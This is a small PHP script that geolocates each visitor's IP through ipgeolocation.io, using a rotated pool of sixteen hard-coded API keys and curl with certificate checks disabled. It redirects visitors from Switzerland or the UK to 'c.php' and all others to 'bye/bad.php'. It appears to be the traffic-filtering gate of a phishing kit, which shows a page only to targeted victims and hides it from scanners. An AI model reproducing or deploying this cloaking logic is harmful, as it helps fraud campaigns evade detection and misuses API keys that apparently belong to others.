<?php

$keys = array(
 "63da69e357dc4c9db1b846c3d998343d",
 "103a0ac5b110412c9a639e3ab5afd99f",
 "d9c8ca199b3f40fabc69dfdfefdc9aa2",
 "9ca8963aff474f50aa21560017ea3a7e",
 "b6b481f32a4446b1a0a6a90067e0f10d",
 "2ff6a3cfbac34272afc205e05a9d629c",
 "4b060192e84d485e9235eda6fee93121",
 "2caffbb7123943d7933b1fe729994186",
 "357c8fda50224090ad413da4c3e7e40e",
 "57726a649e634b4bb854a9cd0658af24",
 "a08fcbcd08e244af90a972d98dde4e78",
 "c461a284199842f893dc5ec8561c9a7a",
 "c753697899f24dca89ff6a1e16b7e0e8",
 "187f062c0c074f89b2a706343f6d69a8",
 "14c7928d2aef416287e034ee91cd360d",
 "62401ee995cd422699c53c2208a880db");

$api = $keys[array_rand($keys)];


function getz($linka)
{

     $chz = curl_init();
           curl_setopt($chz,CURLOPT_URL,$linka);
           curl_setopt($chz,CURLOPT_RETURNTRANSFER,true);
           curl_setopt($chz, CURLOPT_SSL_VERIFYPEER, false);
     $resz = curl_exec($chz);

     return $resz;
}


function GetIPs()
{
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key)
    {
        if (array_key_exists($key, $_SERVER) === true)
        {
            foreach (array_map('trim', explode(',', $_SERVER[$key])) as $ip)
            {
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false)
                {
                    return $ip;
                }
            }
        }
    }
}

$ips = GetIPs();


$az = getz('https://api.ipgeolocation.io/ipgeo?apiKey='.$api.'&ip='.$ips);

if (strpos($az, '"country_code2":"CH"') || strpos($az, '"country_code2":"GB"')) 
{
 {header('Location: ./c.php');
     exit();} 
} 

else
{
    {header('Location: ./bye/bad.php');
     exit();} 
    
}